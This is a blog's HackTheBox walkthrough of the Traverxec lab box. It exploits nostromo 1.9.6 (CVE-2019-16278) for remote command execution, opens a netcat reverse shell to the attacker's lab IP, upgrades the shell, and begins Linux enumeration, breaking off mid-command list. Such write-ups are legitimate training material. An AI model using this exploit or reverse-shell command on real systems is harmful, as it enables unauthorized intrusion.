<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-hacker/hackthebox/traverxec" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide | The Uncommon Engineer</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://ronamosa.io/docs/hacker/hackthebox/traverxec"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide | The Uncommon Engineer"><meta data-rh="true" name="description" content="Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques."><meta data-rh="true" property="og:description" content="Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques."><meta data-rh="true" name="keywords" content="hackthebox traverxec,linux exploitation,web application security,privilege escalation,penetration testing,ctf walkthrough"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://ronamosa.io/docs/hacker/hackthebox/traverxec"><link data-rh="true" rel="alternate" href="https://ronamosa.io/docs/hacker/hackthebox/traverxec" hreflang="en"><link data-rh="true" rel="alternate" href="https://ronamosa.io/docs/hacker/hackthebox/traverxec" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://9UFF3RBJQ9-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"üè¥‚Äç‚ò†Ô∏è Hacker","item":"https://ronamosa.io/docs/category/Ô∏è-hacker"},{"@type":"ListItem","position":2,"name":"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide","item":"https://ronamosa.io/docs/hacker/hackthebox/traverxec"}]}</script><link rel="search" type="application/opensearchdescription+xml" title="The Uncommon Engineer" href="/opensearch.xml">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-DMRNTVGLRC"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DMRNTVGLRC",{anonymize_ip:!0})</script>

<script src="/js/console-clue.js"></script>
<script src="/js/metricool.js"></script><link rel="stylesheet" href="/assets/css/styles.dd12b5e8.css">
<script src="/assets/js/runtime~main.cb34a51e.js" defer="defer"></script>
<script src="/assets/js/main.fb1c5b66.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="ronamosa.io" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="ronamosa.io" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Uncommon Engineer</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/">Docs</a><a class="navbar__item navbar__link" href="/blog/">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about/">About</a><a class="navbar__item navbar__link" href="/projects/">Projects</a><a class="navbar__item navbar__link" href="/changelog/">Changelog</a><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">‚ñ∂ Start Here</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/books/reading-list">üìö Books &amp; Papers</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/study/SCS-C01/">üìó Study</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/Ô∏è-hacker">üè¥‚Äç‚ò†Ô∏è Hacker</a><button aria-label="Collapse sidebar category &#x27;üè¥‚Äç‚ò†Ô∏è Hacker&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/search">16 Essential Search Engines for Penetration Testing and Reconnaissance</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/tryhackme/adbasics">TryHackMe</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/hacker/hackthebox/traverxec">HackTheBox</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/hacker/hackthebox/traverxec">HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/hackthebox/legacy">HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/hackthebox/shocker">HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/hackthebox/lame">HackTheBox Lame Walkthrough - Classic Linux Exploitation and SMB Attacks</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/rtfm">Red Team Field Manual (RTFM) - Essential Commands and Techniques</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/HowToDecodeStuff">Cryptography and Decoding Techniques for CTF and Penetration Testing</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/bufferoverflow/windows">Buffer Overflow</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/acme">ACME Evil Corp Investigation - Digital Forensics and Threat Analysis</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/techforgood">Tech for Good Cryptography Challenge - Secret Message Decryption CTF</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/-engineer">üíª Engineer</a><button aria-label="Expand sidebar category &#x27;üíª Engineer&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/archive/docker-wordpress/docker-wordpress-1">üóÉ Archive</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/Ô∏è-hacker"><span>üè¥‚Äç‚ò†Ô∏è Hacker</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="brief">Brief<a href="#brief" class="hash-link" aria-label="Direct link to Brief" title="Direct link to Brief">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Description</div><div class="admonitionContent_BuS1"><p>These are my notes for the Traverxec (Retired) Box on <a href="https://hackthebox.com" target="_blank" rel="noopener noreferrer">HackTheBox</a>.</p><p>Credits: S/o to tedd_918, hunterbot for the assist.</p><table><thead><tr><th style="text-align:center">OS</th><th style="text-align:center">Level</th><th style="text-align:center">Rating</th></tr></thead><tbody><tr><td style="text-align:center">Linux</td><td style="text-align:center">Easy</td><td style="text-align:center">4/5</td></tr></tbody></table></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="key-learnings">KEY LEARNINGS<a href="#key-learnings" class="hash-link" aria-label="Direct link to KEY LEARNINGS" title="Direct link to KEY LEARNINGS">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ol>
<li>enumerating the system thoroughly and methodically is imperative e.g. <code>sudo -l</code>, <code>find -user &lt;username /&gt;</code> (for files owned)</li>
<li>learn and document cracking techniques to speed things up e.g. hashcat, ssh2john (new to me)</li>
<li>get better at ssh key vector techniques e.g. how to find keys, crack keys, use keys</li>
</ol></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="recon">RECON<a href="#recon" class="hash-link" aria-label="Direct link to RECON" title="Direct link to RECON">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nmap">NMAP<a href="#nmap" class="hash-link" aria-label="Direct link to NMAP" title="Direct link to NMAP">‚Äã</a></h3>
<p>run it all: <code>sudo nmap -v 10.10.10.165 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-traverxec.txt</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">PORT   STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">80/tcp open  http    nostromo 1.9.6</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|_http-title: TRAVERXEC</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|_  Supported Methods: GET HEAD POST</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">|_http-server-header: nostromo 1.9.6</span><br></span></code></pre></div></div>
<p>I can see the <code>http-server-header</code> information, and browse the website to also see: <code>nostromo 1.9.6 at 10.10.10.165 Port 80</code> at the bottom of page.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploit">EXPLOIT<a href="#exploit" class="hash-link" aria-label="Direct link to EXPLOIT" title="Direct link to EXPLOIT">‚Äã</a></h2>
<p>Use searchsploit to find exploits:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ searchsploit nostromo 1.9.6</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">--------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> Exploit Title                                                                   |  Path</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">--------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">nostromo 1.9.6 - Remote Code Execution                                           | multiple/remote/47837.py</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">--------------------------------------------------------------------------------- ---------------------------------</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Shellcodes: No Results</span><br></span></code></pre></div></div>
<p>Pull it down:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ searchsploit -m 47837</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  Exploit: nostromo 1.9.6 - Remote Code Execution</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">      URL: https://www.exploit-db.com/exploits/47837</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">File Type: Python script, ASCII text executable</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Copied to: /home/kali/Documents/RxHack/HTB/BOXES/TRAVERXEC/47837.py</span><br></span></code></pre></div></div>
<p>I go to edit <code>47837.py</code> and see:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Date: 2019-12-31</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Exploit Author: Kr0ff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Vendor Homepage:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Version: 1.9.6</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># Tested on: Debian</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># CVE : CVE-2019-16278</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cve2019_16278</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">py</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">art </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;&quot;</span><span class="token plain">&quot;</span><br></span></code></pre></div></div>
<p>So I Google <code>cve2019_16278.py</code> and find <a href="https://raw.githubusercontent.com/AnubisSec/CVE-2019-16278/master/nostroSploit.py" target="_blank" rel="noopener noreferrer">nostroSploit.py</a></p>
<p>Test it out, and I can get remote command execution on the target:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îå‚îÄ‚îÄ(rxhackk„âøkali)-[~/‚Ä¶/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ python3 ./nostroSploit.py</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">usage: nostroSploit.py [-h] host port [cmd]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">nostroSploit.py: error: the following arguments are required: host, port</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îå‚îÄ‚îÄ(rxhackk„âøkali)-[~/‚Ä¶/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ python3 ./nostroSploit.py 10.10.10.165 80 whoami</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[+] Connecting to target</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[+] Sending malicious payload</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">HTTP/1.1 200 OK</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Date: Thu, 24 Mar 2022 09:20:54 GMT</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Server: nostromo 1.9.6</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Connection: close</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">www-data</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="foothold">FOOTHOLD<a href="#foothold" class="hash-link" aria-label="Direct link to FOOTHOLD" title="Direct link to FOOTHOLD">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="reverse-shell-netcat">reverse shell (netcat)<a href="#reverse-shell-netcat" class="hash-link" aria-label="Direct link to reverse shell (netcat)" title="Direct link to reverse shell (netcat)">‚Äã</a></h3>
<p>We get a bind shell from the target back to  our attack host:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îå‚îÄ‚îÄ(rxhackk„âøkali)-[~/‚Ä¶/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ python3 ./nostroSploit.py 10.10.10.165 80 &quot;nc 10.10.16.2 443 -e /bin/bash&quot;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[+] Connecting to target</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[+] Sending malicious payload</span><br></span></code></pre></div></div>
<p>Set up our listener, and upgrade our shell once we&#x27;re in there:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚îî‚îÄ$ sudo rlwrap nc -lnvp 443                                                                                   1 ‚®Ø</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">listening on [any] 443 ...</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">connect to [10.10.16.2] from (UNKNOWN) [10.10.10.165] 37170</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">id</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">which python</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/python</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">www-data@traverxec:/usr/bin$</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-enumeration">LINUX ENUMERATION<a href="#linux-enumeration" class="hash-link" aria-label="Direct link to LINUX ENUMERATION" title="Direct link to LINUX ENUMERATION">‚Äã</a></h2>
<p>I try these manual find lines first for various vulnerable file types:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">#World writable files directories</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">find / -writable -type d 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">find / -perm -222 -type d 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">find / -perm -o w -type d 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># World executable folder</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">find / -perm -o x -type d 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token 